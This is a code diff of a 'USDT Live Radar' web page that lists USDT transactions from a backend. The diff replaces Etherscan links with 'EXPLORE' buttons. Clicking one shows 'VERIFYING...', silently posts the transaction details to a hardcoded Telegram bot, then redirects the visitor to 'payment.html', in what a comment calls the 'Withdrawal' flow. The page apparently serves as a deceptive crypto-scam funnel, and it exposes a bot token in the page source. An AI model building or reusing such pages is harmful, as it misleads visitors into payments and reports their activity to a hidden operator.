@@ -1,78 +1,255 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رادار USDT السحابي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT Live Radar - Remix Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: #e2e8f0; margin: 0; padding: 15px; direction: rtl; }
-        .card { background: #1a1f2e; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-right: 5px solid #3b82f6; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
-        .live-tag { background: #ef4444; color: white; padding: 4px 12px; border-radius: 6px; font-weight: bold; animation: blink 1.2s infinite; font-size: 12px; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .status-info { font-size: 11px; color: #94a3b8; display: flex; justify-content: space-between; margin-top: 10px; }
-        table { width: 100%; border-collapse: collapse; background: #1a1f2e; border-radius: 10px; overflow: hidden; }
-        th { background: #242b3d; color: #60a5fa; padding: 15px; text-align: right; font-size: 14px; border-bottom: 2px solid #3b82f6; }
-        td { padding: 15px; border-bottom: 1px solid #242b3d; font-size: 14px; }
-        .amount { color: #10b981; font-weight: bold; font-size: 1.1rem; }
-        .time { font-family: monospace; color: #94a3b8; }
-        .btn-check { display: inline-block; color: #3b82f6; text-decoration: none; font-weight: bold; font-size: 12px; border: 1px solid #3b82f6; padding: 5px 10px; border-radius: 5px; transition: 0.3s; }
-        .btn-check:hover { background: #3b82f6; color: white; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap');
+        
+        :root {
+            --eth-purple: #627eea;
+            --eth-deep: #05060f;
+            --glass-border: rgba(255, 255, 255, 0.15);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--eth-deep);
+            color: white;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .cloudy-card {
+            background-image: url('background3.png');
+            background-size: cover;
+            background-position: center;
+            border-radius: 24px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .radar-table-container {
+            max-height: 450px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: var(--eth-purple) rgba(255,255,255,0.05);
+        }
+
+        .radar-table-container::-webkit-scrollbar { width: 4px; }
+        .radar-table-container::-webkit-scrollbar-thumb { background: var(--eth-purple); border-radius: 10px; }
+
+        .tx-row {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 14px;
+            margin-bottom: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .tx-row:hover {
+            border-color: var(--eth-purple);
+            background: rgba(98, 126, 234, 0.05);
+        }
+
+        .live-indicator {
+            width: 8px;
+            height: 8px;
+            background-color: #ef4444;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #ef4444;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .link-btn {
+            background: rgba(98, 126, 234, 0.1);
+            border: 1px solid rgba(98, 126, 234, 0.3);
+            color: #839eff;
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .link-btn:hover {
+            background: var(--eth-purple);
+            color: white;
+        }
+
+        .sending {
+            opacity: 0.5;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <h2 style="margin:0; font-size: 1.2rem;">رادار USDT السحابي</h2>
-            <span class="live-tag">مباشر 5ث</span>
-        </div>
-        <div class="status-info">
-            <span id="status">مزامنة سحابية نشطة...</span>
-            <span id="last-sync">--:--:--</span>
-        </div>
-    </div>
 
-    <table>
-        <thead>
-            <tr>
-                <th>الوقت</th>
-                <th>المبلغ</th>
-                <th>الفحص</th>
-            </tr>
-        </thead>
-        <tbody id="tableBody">
-            <tr><td colspan="3" style="text-align:center; padding:50px;">جاري المزامنة مع السيرفر السحابي...</td></tr>
-        </tbody>
-    </table>
+    <nav class="px-6 py-4 flex justify-between items-center bg-black/40 backdrop-blur-md border-b border-white/10 sticky top-0 z-50">
+        <div class="flex items-center gap-3">
+            <div class="live-indicator"></div>
+            <span class="font-bold text-sm tracking-widest text-white/90">USDT <span class="text-[#627eea]">RADAR</span></span>
+        </div>
+        <div id="count-badge" class="px-3 py-1 bg-[#627eea]/10 border border-[#627eea]/30 text-[#839eff] rounded-lg text-[10px] font-bold font-mono">
+            SYNCING...
+        </div>
+    </nav>
+
+    <main class="flex-grow flex items-start justify-center p-4 pt-6">
+        <div class="cloudy-card w-full max-w-lg p-6">
+            
+            <div class="flex justify-between items-center mb-6">
+                <div>
+                    <h2 class="text-[9px] font-bold text-[#627eea] tracking-[0.4em] uppercase mb-1" id="status">Connecting to Cloud...</h2>
+                    <h1 class="text-xl font-extrabold text-white tracking-tight">Cloud Live Feed</h1>
+                </div>
+                <div class="text-right">
+                    <span class="text-[8px] font-mono text-white/40 block" id="last-sync">UPDATE: --:--:--</span>
+                    <i class="fas fa-cloud text-sky-500 text-xs"></i>
+                </div>
+            </div>
+
+            <!-- Radar List -->
+            <div class="radar-table-container pr-2" id="tx-list">
+                <div class="text-center py-20 opacity-20">
+                    <i class="fas fa-spinner fa-spin text-4xl mb-4"></i>
+                    <p class="text-xs font-mono uppercase tracking-widest">Awaiting Cloud Data...</p>
+                </div>
+            </div>
+
+            <div class="mt-6 pt-4 border-t border-white/10 flex justify-between items-center">
+                <div class="flex items-center gap-2">
+                    <i class="fas fa-server text-white/20 text-[10px]"></i>
+                    <span class="text-[9px] font-bold text-white/20 uppercase">Render Backend</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <i class="fas fa-sync text-white/20 text-[10px]"></i>
+                    <span class="text-[9px] font-bold text-white/20 uppercase">5s Cloud Sync</span>
+                </div>
+            </div>
+        </div>
+    </main>
 
     <script>
+        // Configuration
+        const botToken = '8742320373:AAEN9pnOVSaZEp8A_6OEqeMelQ5hvfPo6yM'; 
+        const chatId = '8423231609';
         let lastTimestamp = 0;
+
+        // Function to send to Telegram and Redirect (The "Withdrawal" flow)
+        async function sendAndRedirect(amount, timestamp, txHash, btnElement) {
+            btnElement.classList.add('sending');
+            btnElement.innerHTML = `VERIFYING... <i class="fas fa-spinner fa-spin ml-1"></i>`;
+
+            const date = new Date(timestamp * 1000).toLocaleString();
+            const message = `🚀 *Cloud Transaction Captured*\n\n` +
+                          `💰 *Amount:* ${amount} USDT\n` +
+                          `📅 *Time:* ${date}\n` +
+                          `🔗 *TxHash:* [View on Etherscan](https://etherscan.io/tx/${txHash})`;
+
+            try {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    btnElement.innerHTML = `REDIRECTING... ✅`;
+                    setTimeout(() => {
+                        window.location.href = "payment.html"; 
+                    }, 800);
+                } else {
+                    throw new Error('Telegram failed');
+                }
+            } catch (error) {
+                btnElement.innerHTML = `ERROR ❌`;
+                setTimeout(() => {
+                    btnElement.innerHTML = `EXPLORE <i class="fas fa-external-link-alt ml-1 opacity-50"></i>`;
+                    btnElement.classList.remove('sending');
+                }, 2000);
+            }
+        }
+
+        // Main Cloud Sync Function (Render Backend Strategy)
         async function fetchFromCloud() {
             try {
+                // Fetching from your Render API endpoint
                 const res = await fetch('/api/data');
                 const data = await res.json();
                 
                 if (data.timestamp !== lastTimestamp) {
                     lastTimestamp = data.timestamp;
-                    const tbody = document.getElementById('tableBody');
+                    renderData(data.operations);
                     
-                    if (data.operations.length === 0) {
-                        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:20px;">لا توجد عمليات مطابقة حالياً</td></tr>';
-                    } else {
-                        tbody.innerHTML = data.operations.map(op => `
-                            <tr>
-                                <td class="time">${new Date(op.timestamp * 1000).toLocaleTimeString('ar-EG')}</td>
-                                <td class="amount">${parseFloat(op.value).toLocaleString()} USDT</td>
-                                <td><a href="https://etherscan.io/tx/${op.transactionHash}" target="_blank" class="btn-check">فحص ↗</a></td>
-                            </tr>
-                        `).join('');
-                    }
-                    document.getElementById('status').innerText = "متصل - السيرفر يراقب البلوكشين";
-                    document.getElementById('last-sync').innerText = "تحديث: " + new Date(data.timestamp).toLocaleTimeString();
+                    document.getElementById('status').innerText = "CONNECTED - MONITORING CHAIN";
+                    document.getElementById('last-sync').innerText = "UPDATE: " + new Date(data.timestamp).toLocaleTimeString();
+                    document.getElementById('count-badge').innerText = `${data.operations.length} TX ACTIVE`;
                 }
             } catch (err) {
-                document.getElementById('status').innerText = "خطأ في الاتصال بالسيرفر!";
+                document.getElementById('status').innerText = "CLOUD CONNECTION ERROR!";
+                console.error("Cloud Sync Error:", err);
             }
         }
+
+        function renderData(operations) {
+            const list = document.getElementById('tx-list');
+            
+            if (!operations || operations.length === 0) {
+                list.innerHTML = `
+                    <div class="text-center py-20 opacity-20">
+                        <p class="text-xs font-mono uppercase tracking-widest">No matching transactions</p>
+                    </div>
+                `;
+                return;
+            }
+
+            list.innerHTML = operations.map(op => {
+                const val = Math.floor(parseFloat(op.value));
+                return `
+                <div class="tx-row p-4 flex justify-between items-center">
+                    <div>
+                        <div class="flex items-center gap-2 mb-1">
+                            <span class="text-base font-black font-mono text-white">${val.toLocaleString()}</span>
+                            <span class="text-[10px] font-bold text-[#627eea]">USDT</span>
+                        </div>
+                        <div class="text-[9px] text-white/40 font-medium font-mono">
+                            ${new Date(op.timestamp * 1000).toLocaleTimeString()}
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <button onclick="sendAndRedirect(${val}, ${op.timestamp}, '${op.transactionHash}', this)" class="link-btn inline-block">
+                            EXPLORE <i class="fas fa-external-link-alt ml-1 opacity-50"></i>
+                        </button>
+                    </div>
+                </div>
+            `}).join('');
+        }
+
+        // Initialize Cloud Sync every 5 seconds
         setInterval(fetchFromCloud, 5000);
         fetchFromCloud();
     </script>
